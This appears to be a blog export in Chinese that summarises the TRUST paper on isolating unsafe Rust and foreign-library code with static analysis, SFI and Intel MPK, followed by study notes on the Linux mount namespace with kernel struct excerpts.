Assumptions我们对不受信任的代码不做任何假设，其中包括不安全的块和外部库。TRUST的可信计算基础(TCB)在运行时包括三个组件，它们是我们假定可信的安全块、Rust运行时和TRUST运行时。不受信任的代码可能具有内存损坏漏洞或攻击者可以将其链接起来进行任意内存访问的随机漏洞系列。这样的攻击者还可以组成一个小工具链，在不受信任的代码上下文中执行任意代码。我们认为远程攻击者知道受害者程序运行的不受信任代码中的这些漏洞。攻击者利用漏洞破坏安全对象，破坏安全块的行为。意识到Rust程序使用的外部库中的漏洞的攻击者可能会利用它们来访问原本仅用于Rust安全使用的特权内存。开发人员应该知道这些假设和使用TRust的好处，以确保只在安全块中使用对安全性至关重要的内存对象。如果上述假设成立，TRUST保证外部代码不能读取或写入仅由受信任代码使用的安全对象。 Design and ImplementationTRUST认为任何内存对象都是不安全的，如果它被用在由不安全Rust块和外部函数接口(FFI)组成的不受信任的代码中，通过FFI，用其他语言(如C&#x2F; C++)编写的外部库代码可以与Rust结合使用。TRUST可以静态地证明不受信任代码影响的对象被归类为安全对象。TRUST将不安全的对象隔离在单独的区域中，这样在不受信任的代码中进行利用就不会影响到该区域之外。只有安全块允许访问这两个内存区域，而外部代码不能读取或写入安全对象，并且不安全块不能写入安全对象。要隔离不受信任的代码，TRUST会在编译时分析和转换Rust程序，并使用其运行时库运行生成的程序。 分析和转换。 TRUST首先在从Rust源代码到LLVM IR的编译过程中收集Rust特有的属性。这些属性包括指示LLVM IR指令是否属于不安全块的不安全信息，以及指示给定函数是否属于外部函数接口(FFI)的函数API信息。编译后的LLVM IR代码然后传递到点对和价值流分析阶段。此阶段识别不安全内存操作中使用的指针，并执行必要的操作来隔离它们。 它将访问不安全堆栈对象的指令标记为稍后重新定位，并将堆指针分配调用重新路由到不安全分配器。然后，这个阶段的输出被传递给LLVM编译器，LLVM编译器运行几次来完成TRUST的静态操作。最后阶段首先将所有不安全堆栈指针重定位到不安全对象堆栈，最后在外部库调用周围插入入口和出口。 运行时。 要为转换后的程序提供服务并正确隔离不受信任的代码，TRUST会挂钩多个系统服务并维护每个线程的元数据。来自不受信任代码的堆分配器调用被重路由到另一个不安全的堆分配器，该分配器使用不安全区域中的块为请求提供服务。TRUST进一步挂钩来自外部库的内存管理系统调用，以防止它们更改页表属性。它还增加了pthread来初始化或销毁其他线程的堆栈。 挑战。 在设计TRUST时，我们遇到了三个值得注意的挑战。首先，安全Rust的内存安全性在编译时并不是完全可以证明的。对于编译器无法推断的内存访问，比如对堆对象的访问，Rust使用智能指针在运行时动态地确保空间和时间安全。因此，在不安全块中操作指针或智能指针元数据可能会导致安全块中的内存安全错误。在识别可能不安全的对象或指针使用时，TRUST必须考虑它们的元数据。其次，与不安全块不同，外部库不能用SFI隔离。这些外部库假定以可执行二进制文件(如共享对象或静态库)的形式交付。无论编写外部库的语言是什么，TRUST都不能在编译时对它们进行分析和转换。一些研究表明，SFI可以应用于二进制程序，但会产生相对较高的开销。出于这个原因，TRUST转而依赖于Intel MPK机制来隔离外部库并限制它们的内存访问。最后，Rust通过Alloc crate分配堆内存，并通过智能指针和容器crate(如Box、Vec、String)处理堆指针，这对指向和价值流分析构成了挑战。Rust没有直接调用堆分配器来获取内存，而是依靠这些crate来调用分配器并创建智能指针。 Alloc crate公开了__rust_alloc、__rust_realloc、__rust_alloc_zeroed等函数，包装了相应的堆分配器接口。使用这种设计，所有堆指针(安全和不安全)似乎只混叠了少数源和单个接收器。TRUST通过利用价值流分析为不安全指针的分配构造调用堆栈来处理此问题。然后，它创建调用堆栈的克隆，并将其重路由到不安全的分配器。 Points-to AnalysisTRUST在中级IR (MIR)和LLVM IR级别分析Rust程序，以找到不安全对象的分配位置。TRUST认为分配站点是安全的，如果发现从该站点到不安全块中的内存访问指令的流或到外部的流，则将该分配站点分类为不安全的外部库。只有当TRUST可以可靠地断定从分配站点获得的指针永远不会流向外部库并用于在不安全块中写入时，分配站点才保持安全，这一点我们将在本节的其余部分中描述。 MIR-level Analysis TRUST将每个LLVM IR指令与该指令所属的块关联起来，以便在Rust编译器将程序从MIR转换为LLVM IR时进行后续分析。Rust编译器首先将源代码翻译成MIR，并在该级别执行特定于Rust的静态分析。例如，与所有权相关的规则主要在该级别进行检查。出于这个原因，每个MIR指令都被标记为它所属的块，要么是安全的，要么是不安全的。然而，当程序被翻译成LLVM IR时，这个标签不保留，因为Rust编译器不需要确定哪个块是生成LLVM IR指令的。相反，TRUST需要区分从不安全块生成的LLVM IR指令进行分析。为此，TRUST扩展了Rust编译器，将不安全元数据附加到生成的LLVM-IR指令上。 Points-to Analysis TRUST执行点到分析，将内存分配位置(即alloca、对malloc的调用或类似)分为安全和不安全。我们将分配指令视为指针的来源，同时也考虑到堆栈对象。上下文敏感的价值流分析SVF&#x2F;SUPA支持我们的点对分析，以提高精度。TRUST迭代地执行自下而上的价值流和点对分析，以获得精确而合理的点对关系，并使用结果对分配地点进行分类。这种自下而上的分析是一个图遍历问题，其中节点是指针，边是使用它们的指令。在这个意义上，点到分析下的程序可以被看作是SVF&#x2F;SUP定义的价值流图(VFG)。如果分配站点产生一个指向不安全块中至少一条指令的指针，则将其归类为不安全的。否则，分配位置被分类为安全，这意味着它位于安全块内，并且它产生的指针不会在不安全块中被操作或使用。即使在安全和不安全块之间共享内存对象，也会从不安全区域分配对象，因为指针的分配位置变得不安全。此策略使得TRUST从安全区域分配对象的决策是合理的，也就是说，不受信任的代码可能访问的内存对象总是从不安全区域分配。 这种方法的一个缺点是，如果由于分析点的精确度有限，TRUST无法将一个只有安全代码访问的内存对象与另一个不安全的对象区分开来，则该对象可能被归类为不安全的对象。 Modifying SVF SVF不处理一些LLVM IR指令，比如InsertValueInst和ExtractValueInst, Rust严重依赖于它们来打包和解包智能指针。SVF将任何进入InsertValueInst的指针视为进入黑洞，因为该指令产生一个简单的打包结构体，它不是指针。类似地，从ExtractValueInst中产生的任何指针似乎都来自黑洞。 我们修改了SVF，将这些情况处理为与getelementptr相关的指令，然后是加载或存储。此外，SVF不处理用于指针运算的IntToPtr和PtrToInt指令。我们通过修改SVF来创建从PtrToInt指令到IntToPtr指令的虚链接，使用虚指针强制转换，SVF将其视为指针拷贝，因为这些指令通常非常接近。 Working budget 尽管上下文敏感的分析是精确的，但是对于大型程序来说，它的代价是非常昂贵的。 因此，SVF将工作预算定义为给定节点的上下文和边返回遍历的最大数量。 此外，我们不分析所有指针，而只考虑不安全块中使用的指针作为候选指针。对于每个候选指针，我们迭代地向后遍历VFG，直到遵循所有可能的路径，直到上下文预算耗尽或我们到达可能的分配地点。在预算耗尽的情况下，我们不是终止正在考虑的指针的遍历，而是放松精确性，并回落到受边缘预算约束的流敏感分析。用户可以通过向TRUST提供上下文和流预算参数来进行分析，从而在准确性和时间之间进行权衡。我们将在§6.2中进一步讨论这种设计对分析的完整性和可靠性的影响。 Handling Smart Pointers 我们发现，即使pointto分析没有报告不安全块中指针的任何修改，由于Rust运行时的设计，指针的使用也可能变得不安全。Rust中的一些指针是用智能指针类型来表示的，这些智能指针类型包含一些用于多种目的的属性，包括在运行时进行动态边界检查。操作这些属性可能导致在安全块内进行超出边界的内存访问，因为使用损坏属性的动态边界检查无法找到问题，如示例(图5)所示。 我们的分析克服了这一点，如果分配对象的任何字段可能在不安全块中被操纵，并将相应的分配站点标记为不安全，则将聚合分配站点视为不安全的。 Allowlisting Crates 在分析不安全指针时，TRUST认为某些不安全的块来自某些允许列出的crate(例如，libstd, libballoc, libcore)是安全的。换句话说，在不安全块中单独使用这些crate中的指针并不会使其成为候选对象对点进行分析或重新定位。我们发现这是一个必要而合理的设计选择，原因有二。首先，Rust的核心大部分是与内核同步的，需要系统调用和低级操作，这些操作必须封装在不安全的块中。如果我们认为所有这些都是不可信的，那么Rust程序将实际上没有安全对象，这使得TRUST无效。其次，最近的一项研究表明，这种关键的板条箱可以被正式验证。核心运行时中的不安全块不能使用安全的Rust来编写，但是静态地验证它们的正确性，因此仍然可以使用一些可用机制来安全可信。这支持了我们将它们包含在allowlist中的决定。请注意，尽管进行了静态验证，但仍然需要信任，因为并非每个不受信任的代码都可以从目标静态验证中受益。 Function Cloning to Improve Precision如前所述，TRUST面临的挑战之一是LLVM IR级别的堆分配站点数量很少。所有的堆指针似乎都来自LLVM IR中的包装器函数中的少数分配点，这导致现有的价值流分析§5.1得出结论，所有指针共享发现的少数源和汇。TRUST通过根据上下文自动克隆处理安全对象和不安全对象的函数来解决这个问题，从而提高分析点的精度。 这是通过以下三个步骤完成的。 Step 1. Assigning Call Site-IDs to VGF Nodes. TRUST的VFG基于SUPA为每个呼叫站点创建了两组虚拟节点，即in-nodes和out-nodes。内节点将调用的实际指针参数连接到被调用方的形式形参，而外节点包括通过实际返回语句返回或存储在任何接受的参数中的任何指针的副本。内节点和外节点都被分配了相同的调用站点id (cs-ID)，而cs-ID又与调用方和被调用方函数相关联。如果callee不接受指针参数，它所关联的所有调用站点都将具有空的内节点。对于返回的指针和输出节点也是如此 Step 2. Finding Clone Candidates. TRUST通过向后遍历在点到分析期间获得的VFG来找到要克隆的函数，直到它到达一个调用堆分配的站点(即malloc)。它将在遍历过程中遇到的内节点和外节点的cs- id推入一个称为调用站点堆栈的堆栈。然后，它解决了呼叫站点堆栈上的平衡括号问题，其中具有匹配cs- id的进出节点对被删除，因为它们对实际分配路径没有贡献，留下不平衡的内节点和出节点的cs- id。最后，它还删除了节点内的cs- id，因为这些cs- id表示调用方函数，但是TRUST的目标是用导致不安全分配器的克隆函数替换被调用方。其余一组连续的节点外cs- id跟踪到堆分配站点。所有与这些剩余cs- id关联的被调用函数都是克隆的，克隆的版本具有__不安全的前缀名称和一个额外的参数。 Step 3. Transforming the Call Sites. 在克隆函数之后，TRUST通过递归地转换适当的调用位置来重建分配路径。如果调用站点的cs-ID仍在调用站点堆栈中，则TRUST将替换调用站点，并调用被调用函数的克隆。附加参数是位向量，其中每个位表示相应的调用站点是否必须路由到不安全分配器。对于被调用方是虚拟表成员的间接调用，使用的不是附加参数，而是通过线程特定数据结构中的unsafe_flag项传播的位标志。图6显示了这种克隆如何帮助提高分析的准确性。最初，所有指针(安全的和不安全的)都是从安全分配器分配的(绿色虚线表示的路径)。在通过TRUST进行克隆之后，不安全指针将从不安全分配器进行明确的分配(棕色虚线表示的路径)。 Instrumenting Memory Accesses for SFITRUST将存储指令置于不安全块中，以防止它们直接破坏安全对象。特别是，TRUST会插入掩码地址的指令在这些存储指令之前，强制指令只写入不安全区域，如图7所示。插入指令使用的静态边界是在程序启动时确定的。此外，TRUST还在安全块中设置了一些存储指令，以解决混乱的代理问题。如前所述，一些智能指针是在不安全区域上分配的，因为它们是在不安全块中合法修改的。这将使它们的元数据暴露给攻击者任意破坏，这种破坏可能会混淆使用元数据进行边界检查的安全块。TRUST会自动识别安全块内的易受攻击的指针流，并插入边界检查，确保指针落在不安全区域内。为了找到易受攻击的指针流，TRUST使用了值流图。TRUST首先在值流图中找到从不安全指针到安全块中存储指令的路径。沿着这样的路径，TRUST插入一个边界检查，以确保不安全指针指向不安全区域，如图8所示。最后，常用的内存修改函数(如memset、memcpy和memmove)是专门处理的，而不是在其中插装。 在调用站点，TRUST插入一个边界检查，以确保如果目标指针不安全，则要写入的整个内存范围都包含在不安全区域中。 Unsafe Object StackTRUST将程序转换为三个堆栈。第一种是默认堆栈，它只包含受TRUST保护的程序上的安全堆栈对象。另外两个是用于容纳不安全堆栈对象的堆栈。我们将其中一个外部库称为不安全执行堆栈，并在§5.5中进一步描述。受SafeStack的启发，我们将程序转换为将不安全对象存储在另一个称为不安全对象堆栈的堆栈上。SafeStack通过将潜在的易受攻击的缓冲区移动到一个单独的区域来减轻基于堆栈的缓冲区溢出攻击，在这个区域中，它们不会再次被利用，也不会导致更危险的攻击，例如控制流劫持。我们将指向这些堆栈的指针存储在线程特定的元数据对象中，而该对象的地址又保存在指定的寄存器r15中。编译器被增强为将寄存器放在一边，而不是将其用于寄存器分配，并且TRUST运行时使用不安全堆栈的地址初始化r15。 因此，对堆栈对象的所有不安全内存访问指令都转换为使用r15而不是具有正确偏移量的rsp。或者，TRUST可以使用%gs或%fs代替r15，以避免由于潜在的寄存器溢出而导致的性能下降。Intel的FSGSBASE指令允许程序直接访问fs&#x2F;gs段寄存器，如果一个寄存器不用于其他目的，TRUST可以使用其中一个来代替r15。 Instrumenting External Library CallsTRUST在外部库调用之前和之后插入入口和出口，以便使用Intel MPK隔离外部库。外部函数，即被调用者，最初负责将堆栈指针保存在其堆栈上并恢复它，攻击者可以从头创建一个假堆栈，并在返回Rust代码时设置堆栈指针。这些门更新pkru寄存器，以便在外部库运行时临时限制内存访问权限，切换堆栈指针，因此外部库使用不安全的堆栈，并将堆栈指针保存在受保护的内存中，以便在从外部库返回后检索。它们还为TRUST运行时编写线程特定数据结构的适当数据项(参见§5.6)。 Entry Gate 在入口门中，程序将安全堆栈指针(rsp)保存在位于特殊区域(始终可读)的线程特定数据结构中。它将数据结构中的域条目更新为1，以表明程序在外部库的上下文中运行，然后pkru寄存器撤销对安全内存区域(pkey 0)的读写权限，以及对始终可读的特殊区域(pkey 2)的写权限。最后，rsp被设置为指向外部库的不安全执行堆栈。 Exit Gate 从外部库返回时，程序进行一个简单的调用，将r15的内容与入口门先前保存的内容进行匹配。如果不匹配，TRUST认为这是违规，并将r15寄存器重置为正确的值。这个检查很重要，因为攻击者可能会误导TRUST在不安全的堆栈上执行安全块，如上所述。接下来，它将安全区域和特殊页(r15寄存器内容在进入时保存在其上)的访问权限更新为可读写。 此时，对安全区域的写权限已经恢复，因此TRUST将特定于线程的数据的域条目值更新为0。最后，它将保存的安全堆栈指针从偏移量加载到r15，并更新RSP。 Comparison to SFI 一个潜在的替代我们的设计选择，使用MPK，是SFI。先前的研究已经报道，甚至可以将SFI应用于二进制程序，并且理论上也可以将SFI用于我们的目的。我们选择使用MPK的理由是运行外部库时域更改的频率和内存访问指令的数量。SFI的性能开销主要与内存指令的总数有关，因为每个内存指令都必须使用绑定检查。相反，MPK的开销与转换次数有关。 在隔离外部库时，我们希望有相对较少的转换，而每个库调用可能有许多内存指令。 TRUST RuntimeTRUST运行时由安全区域中用于TRUST的每个线程元数据存储、处理不安全对象分配的附加堆分配器、挂钩到内存管理系统调用以禁止外部库更改页面属性，以及挂钩到为新线程初始化TRUST运行时的pthread组成。不安全区域建立后，这些组件的工作原理如下。首先，不安全堆分配器和系统调用挂钩确保不受信任代码分配的任何对象或页面都位于不安全区域。不这样做不会破坏安全性，因为不受信任的代码被禁止单独访问安全区域，从而导致误报。其次，pthread钩子为TRUST准备新线程所需的额外堆栈，并在线程终止时销毁它们。第三，检测代码和运行时使用每个线程的元数据来存储特定于trust的数据，必须保护这些数据不受不受信任的代码的攻击。第四，系统调用挂钩防止不受信任的代码更改页面属性，而基于mpc的TRUST隔离依赖于页面属性。 Establishing the Unsafe Region 当程序开始时，TRUST通过从操作系统获得足够多的虚拟页面来建立不安全区域，在我们的实现中，这些页面的总大小为4GB。这些页面使用标志MAP_FIXED进行映射，并配置为具有不安全区域的pkey。正如我们后面所描述的，对不安全区域上的内存块或页面的任何需求都将使用这些映射来满足。在启动时映射不安全区域的方法自动确保剩余的安全块总是从安全区域获取块或页面，因为操作系统不会映射已经映射的页面，除非明确请求。值得注意的是，如果程序预期使用超过4GB的不安全对象，则可以增加保留地址范围的大小，并且这样做不会产生性能或内存开销。请求操作系统内核保留更多内存只会设置更多的虚拟页，并且只有实际分配的虚拟页才会映射到物理页。如果操作系统内核支持一种不同的方式，TRUST可以用来保留一个特定的虚拟地址范围，而不需要创建一个固定的映射，那就更好了，但是据我们所知，我们的原型所运行的Linux内核没有这样的功能。 TRUST Metadata TRUST为每个线程维护一个元数据存储，以保存特定于TRUST的数据，并表示TRUST运行时其他组件的特权级别(例如，安全、不安全或外部)。元数据有一个表示其特权级别的位标志，称为外部。外部位将在程序进入外部库时设置，并在退出时取消设置。元数据还包括安全堆栈指针的字段，TRUST使用它来验证其出口门上的堆栈指针完整性，如§5.5所述。 The Unsafe Heap Allocator TRUST使用额外的，修改堆分配器，使用mimalloc 1.7.0[30]管理不安全区域上的堆。来自不可信代码的堆分配请求通过函数克隆(§5.2)重定向到这里，这个分配器用来自不安全区域的块来服务请求。修改后的分配器通过从已建立的不安全区域获取堆的新页面来管理其在不安全区域上的堆。对于大块的请求(通常直接使用mmap)也使用不安全区域页面进行处理。程序以两种方式使用这个不安全堆。TRUST从源代码编译的不安全块被转换为在需要时显式调用不安全堆分配器。 相反，外部库不能转换，因为它们是作为可执行二进制文件交付的。因此，TRUST还向安全堆分配器插入一个钩子，以选择性地将堆分配器调用路由到不安全分配器。 TRUST使用其元数据中的外部字段(我们在本节前面介绍过)来确定调用哪个堆分配器。该字段由§5.5中描述的入口和出口门维护，并且这个钩子使用这个位来确定当前上下文。请注意，虽然该位通过放置在安全区域内来防止针对不受信任代码的攻击，但恶意损坏该位并不会破坏TRUST的安全保证。这种损坏的预期结果是将安全对象分配给不受信任的代码，从而导致误报。对于堆内存的重新分配和释放，运行时库检查有问题的指针是位于安全区域还是不安全区域，并相应地重路由调用。 Hooking System Calls 运行时挂钩内存管理系统调用(例如，mmap, mprotect或mremap)来禁止外部库任意操作页面属性。特别是，TRUST确保调用映射的内存的起始地址和结束地址位于上述与不安全区域对应的虚拟地址范围内。运行时还会从安全块重定向对mmap、mremap的调用，试图从指定的不安全区域地址空间映射内存。来自外部代码的类似请求分别被重定向到mmap和mremap的不安全分配器malloc或realloc。mprotect钩子拒绝来自外部库的任何试图禁止它修改页面属性的尝试，包括pkey。此外，外部库会使用ERIM中提出的算法静态检查是否存在更新pkru的指令。 Hooking pthread 运行时库挂钩线程创建库，以分配不安全的堆栈和线程特定的数据结构。对于由安全块创建的新线程，挂钩的pthread函数将特定于线程的数据分配到适当的区域。然后，它在不安全区域中分配不安全堆栈，并将它们的指针写入线程特定数据结构的相应条目中。最后，它用指向线程特定数据结构的指针更新r15寄存器，并让执行继续进行。 Hooking More System Calls TRUST运行时必须钩住更多的系统调用来防御最近的一项研究列举的攻击。例如，sigreturn是一个系统调用，可以通过破坏堆栈上的pkru寄存器的内容来绕过传统的基于pku的进程内隔离技术。TRUST可以通过在系统调用之前存储pkru来防止这种情况，这样任何篡改寄存器的尝试都将无效。类似地，TRUST可以自然地采用早期研究发现的钩子，以进一步加强安全Rust免受利用脆弱的外部库的更多攻击。除此之外，运行时还必须勾起更多的系统调用来阻止隔离绕过，如先前的研究所述。Jenny已经展示了我们如何使用seccomp和ptrace全面过滤系统调用，因此我们可以将TRUST运行时和Jenny结合起来以达到完整性。根据Jenny报告的开销，使用Jenny产生的额外开销预计在5%以下。","categories":[{"name":"论文精读","slug":"论文精读","permalink":"http://example.com/categories/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB/"},{"name":"RUST","slug":"论文精读/RUST","permalink":"http://example.com/categories/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB/RUST/"}],"tags":[]},{"title":"学习 Linux Mnt_Namespace实现","slug":"学习-Linux-Mnt-Namespace实现","date":"2023-11-24T08:06:21.000Z","updated":"2024-01-10T02:19:11.664Z","comments":true,"path":"2023/11/24/学习-Linux-Mnt-Namespace实现/","link":"","permalink":"http://example.com/2023/11/24/%E5%AD%A6%E4%B9%A0-Linux-Mnt-Namespace%E5%AE%9E%E7%8E%B0/","excerpt":"基本介绍Linux使用namespace来表示从不同进程角度所见的视图。 不同的namespace的进程看到的资源或者进程表是不一样的，相同namespace中的不同进程看到的是同样的资源。 task_struct就是Linux的进程控制块(PCB)，存放进程的信息。","text":"基本介绍Linux使用namespace来表示从不同进程角度所见的视图。 不同的namespace的进程看到的资源或者进程表是不一样的，相同namespace中的不同进程看到的是同样的资源。 task_struct就是Linux的进程控制块(PCB)，存放进程的信息。 每个task都有一个指针指向一个namespace，存放在task_struct-&gt;nsproxy中，同一个container的所有进程指向的namespace是相同的，不同container的进程所指向的namepsace是不同的。 sched.h - include&#x2F;linux&#x2F;sched.h - Linux source code (v6.6) - Bootlin 1234struct task_struct &#123; /* Namespaces: */ struct nsproxy *nsproxy;&#125; nsproxy.h - include&#x2F;linux&#x2F;nsproxy.h - Linux source code (v6.6) - Bootlin 12345678910111213141516171819202122232425262728/* * A structure to contain pointers to all per-process * namespaces - fs (mount), uts, network, sysvipc, etc. * * The pid namespace is an exception -- it&#x27;s accessed using * task_active_pid_ns. The pid namespace here is the * namespace that children will use. * * &#x27;count&#x27; is the number of tasks holding a reference. * The count for each namespace, then, will be the number * of nsproxies pointing to it, not the number of tasks. * * The nsproxy is shared by tasks which share all namespaces. * As soon as a single namespace is cloned or unshared, the * nsproxy is copied. */struct nsproxy &#123; refcount_t count; struct uts_namespace *uts_ns; struct ipc_namespace *ipc_ns; struct mnt_namespace *mnt_ns; struct pid_namespace *pid_ns_for_children; struct net *net_ns; struct time_namespace *time_ns; struct time_namespace *time_ns_for_children; struct cgroup_namespace *cgroup_ns;&#125;;extern struct nsproxy init_nsproxy; 有一些新的namespace还在实现中，比如Device namespaces [LWN.net] mnt_namespacemnt namespace为进程提供独立的文件系统视图。当clone（）函数中带有CLONE_NEWNS标志时，新的mnt ns在子进程中被创建，新的mnt ns是一份父mnt ns的拷贝， 但是在子进程中调用mount安装的文件系统，将独立于父进程的mnt ns，只出现在新的mnt ns上（如果考虑到shared subtree，情况会复杂许多）。 mount.h - fs&#x2F;mount.h - Linux source code (v6.6) - Bootlin 123456789101112131415161718struct mnt_namespace &#123; struct ns_common ns; struct mount * root; // 当前namespace下的根文件系统 /* * Traversal and modification of .list is protected by either * - taking namespace_sem for write, OR * - taking namespace_sem for read AND taking .ns_lock. */ struct list_head list; // 当前namespace下的文件系统列表（vfsmount list） spinlock_t ns_lock; struct user_namespace *user_ns; struct ucounts *ucounts; u64 seq; /* Sequence number to prevent loops */ wait_queue_head_t poll; u64 event; unsigned int mounts; /* # of mounts in the namespace */ unsigned int pending_mounts;&#125; __randomize_layout; 由于mnt_namespace的核心是提供文件系统视图，所以与struct vfsmount（代表一个安装的文件系统）紧密相关。而理解struct vfsmount，也是理解mnt_namespace的关键。 mount.h - include&#x2F;linux&#x2F;mount.h - Linux source code (v6.6) - Bootlin 123456struct vfsmount &#123; struct dentry *mnt_root; /* root of the mounted tree */ struct super_block *mnt_sb; /* pointer to superblock */ int mnt_flags; struct mnt_idmap *mnt_idmap;&#125; __randomize_layout; 文件系统层次化对 Linux 系统来说一切皆文件，Linux 使用树形的层次化结构来管理所有的文件对象。 完整的 Linux 文件系统，是由多种设备、多种文件系统组成的一个混合的树形结构。我们首先从一个单独的块设备来分析其树形结构的构造。 块设备的层次化（superblock&#x2F;inode&#x2F;dentry） 在Linux内核中，struct super_block 是一个重要的数据结构，用于代表文件系统的超级块。超级块包含了文件系统的元数据，例如文件系统类型、块大小、空闲块和inode的数量等。每个在内存中挂载的文件系统都有一个对应的 struct super_block 实例。 struct block_device 是另一个重要的数据结构，用于表示块设备，如硬盘。这个结构体包含了关于块设备的信息，如设备的大小、读写方法、驱动程序引用等。 struct super_block 中指向 struct block_device 的指针的存在，是为了将文件系统与其下层的块设备关联起来。当文件系统需要读写数据时，它会通过这个指针访问相应的块设备。这个指针也允许文件系统查询块设备的状态（如设备是否可用）或者进行特定的设备操作（如数据同步）。 这样的设计允许内核以抽象的方式处理文件系统操作，无论文件系统位于哪种类型的块设备上（例如，硬盘、SD卡、网络块设备等）。这也为操作系统提供了一种可以在运行时动态添加、删除或者修改文件系统和设备的能力，这是现代操作系统的一个重要特性。、 我们在计算机系统中使用文件时，我们并不直接与硬盘或其他块设备进行交互。而是通过文件系统，这是一种组织、存储和检索数据的方法。文件系统作为一种抽象机制，允许我们以文件和目录的形式访问底层的块设备，而不需要关心数据在硬盘上具体是如何存储的。 这就是 struct super_block 数据结构在Linux内核中的角色。它将块设备（block_device）和文件系统类型（file_system_type）两个全局因素连接起来，用来标识一个块设备。你可以将其视为一个翻译器或者解释器，它知道如何将我们对文件的操作转换为对硬盘上特定块的读写。 让我们具体看一下这两个全局因素： 块设备 (block_device)：这是硬盘或其他存储设备的表示。它提供了一个接口，我们可以通过这个接口读写设备上的数据块。 文件系统类型 (file_system_type)：这是文件系统的类型，例如ext4、NTFS或FAT32等。不同的文件系统类型有不同的组织结构和规则，它们定义了如何在块设备上存储和检索数据。 当我们挂载一个文件系统时，Linux内核会创建一个新的 struct super_block 实例。这个实例包含了特定文件系统的信息（通过 file_system_type 指定）以及对应的块设备（通过 block_device 指定）。当我们通过文件系统访问数据时，内核就会使用这个 struct super_block 实例来翻译我们的请求，将其转换为对块设备上特定块的读写。 因此，struct super_block 在构建文件系统树形结构时起着核心的作用。它是文件系统和块设备之间的连接，允许我们以一种抽象的、对用户友好的方式来使用存储设备。 确定了 super_block 以后，就可以使用文件系统提供的方法来解析块设备的内容，形成一个块设备内部的树形结构，也就是我们熟悉的文件夹、文件的层次结构。 在Linux文件系统中，struct inode 是一个非常重要的数据结构，它代表了文件系统中的一个对象，这个对象可以是一个文件或者一个目录。每个 inode 都有一个唯一的编号，被称为 inode 编号，这个编号在 struct inode 的 i_ino 成员中记录。 这里的 “偏移” 是指 inode 在块设备中的位置。每个 inode 在块设备中都有一个特定的位置，这个位置由 inode 编号决定。我们可以通过 i_ino 成员找到文件系统中相应的文件或目录。 当文件系统被挂载和 super_block 被确定后，文件系统就可以开始解析块设备的内容了。文件系统将会读取块设备上的数据，根据 inode 的信息构建出文件和目录的层次结构，这就是我们常说的文件系统树。 这个过程就像是读取一本书的目录，然后根据目录的信息找到每一章的开始位置。在这个比喻中，inode 就像是目录中的每一项，i_ino 是每一章的页码。 总的来说，struct inode 和其 i_ino 成员是创建文件系统树形结构的关键。通过它们，我们可以在块设备上找到任何文件或目录的位置，进一步读取或修改它们的内容。 Linux系统中，struct dentry（目录项）是另一个非常重要的数据结构，它用来辅助和优化文件系统的操作。struct dentry 主要用于缓存文件的元数据，比如文件名和文件的层次结构等信息。这些信息是从 struct inode 中获取的，但是通过在 dentry 中缓存这些信息，可以避免频繁地访问 inode，从而提高文件系统的效率。 通常情况下，一个 struct dentry 对应一个 struct inode，也就是说，每个文件或目录都有一个对应的 dentry。但是，在有些情况下，可能会有多个 dentry 对应同一个 inode。这种情况通常发生在创建硬链接的时候。硬链接是指在文件系统中创建一个新的文件名，但是这个新的文件名实际上指向的是已经存在的另一个文件的 inode。也就是说，通过硬链接，我们可以用不同的文件名来访问同一个文件。 在 struct dentry 中，d_parent 成员是一个指向父目录的 dentry 的指针，也就是说，它指向了该文件或目录的上一级目录。d_subdirs 是一个链接列表，它连接了所有的子目录。这两个成员使得我们可以在文件系统树中上下移动，找到任何需要的文件或目录。 多设备的层次化（mount&#x2F;vfsmount）在Linux系统中，不止可以有一个块设备（如硬盘或USB驱动器）和相应的文件系统，我们可以连接并使用多个这样的设备。每个设备都有自己的文件系统，这个文件系统可以被视为一棵树，它的根是设备上的最顶级目录。 然而，对于用户来说，他们并不直接看到这些单独的设备和文件系统。相反，他们看到的是一个统一的、连续的文件系统，这就是所谓的文件系统挂载。 挂载是将一个设备的文件系统树连接到另一个设备的文件系统树的过程。在这个过程中，一个设备（我们称之为父设备）的一个目录（我们称之为挂载点）被选中，然后另一个设备（我们称之为子设备）的文件系统树就会在那个挂载点上连接。这个挂载点就成为子设备文件系统树的根目录。 这样，当用户访问挂载点时，他们实际上是访问了子设备的文件系统。例如，假设我们有一个硬盘设备，其文件系统包含一个名为 “&#x2F;photos” 的目录，我们可以将一个USB驱动器挂载到这个目录上。然后，当我们访问 “&#x2F;photos” 目录时，我们实际上是访问了USB驱动器的内容。 在Linux内核中，挂载点是由 struct dentry 结构表示的，这个结构代表了父设备文件系统中的一个目录。当挂载发生时，这个 dentry 将会指向子设备的文件系统树的根。 通过挂载，我们可以将多个设备和文件系统组织成一个复杂的、统一的、连续的文件系统，这对用户来说是透明的，使得他们可以轻松地管理和访问文件，而不需要关心文件实际上存储在哪个设备上。 mount&#x2F;vfsmount 在Linux系统中，struct mount 结构是用来表示和管理挂载点的。当你将一个设备（我们可以称之为子设备）的文件系统挂载到另一个设备（我们可以称之为父设备）的特定目录时，系统会创建一个 struct mount 结构来跟踪这个挂载操作。 struct mount 结构包含了管理和维护挂载点所需的所有信息。例如，它可以帮助系统知道当访问挂载点时，应当将文件操作（如打开文件、读取文件等）重定向到子设备的哪个文件或目录。 在文件系统树中，struct mount 结构实际上表现为一个链接，连接了父设备的挂载点和子设备的文件系统树的根。当你通过父设备的文件系统路径访问子设备的文件或目录时，struct mount 结构就会起作用，它会将你的请求引导到正确的设备和文件。 mount tree 在Linux系统中，通过使用struct mount结构，一个子设备的文件系统（也就是一棵子设备树）可以被挂载到父设备树的一个特定dentry节点上。这个dentry节点代表父设备文件系统中的一个目录，它将作为挂载点来访问子设备文件系统。 当一个dentry变成挂载点时，系统会给它设置一个标志，这个标志叫做DCACHE_MOUNTED。这个标志告诉系统，当访问这个dentry时，实际上应该访问子设备的文件系统，而不是原本在父设备上的内容。因此，一旦dentry成为挂载点，原本在该目录下的内容就不能被直接访问了，取而代之的是子设备文件系统根节点下的内容。 struct mount结构本身也可以形成一个树状结构，这个结构反映了所有挂载点和子设备文件系统之间的关系。 在Linux系统中，我们通常使用mount -t fstype devname pathname命令来挂载子设备。在这个命令中，fstype参数指定了文件系统的类型，例如ext4或ntfs；devname参数指定了设备的名字，例如&#x2F;dev&#x2F;sdb1；pathname参数指定了挂载点的路径，例如&#x2F;mnt&#x2F;usb。 Linux 拥有非常灵活的挂载规则： 一个设备可以被挂载多次： 可以看到同一个子设备树，同时被两个 struct mount 结构所引用，被挂载到父设备树的两处不同的 dentry 处。 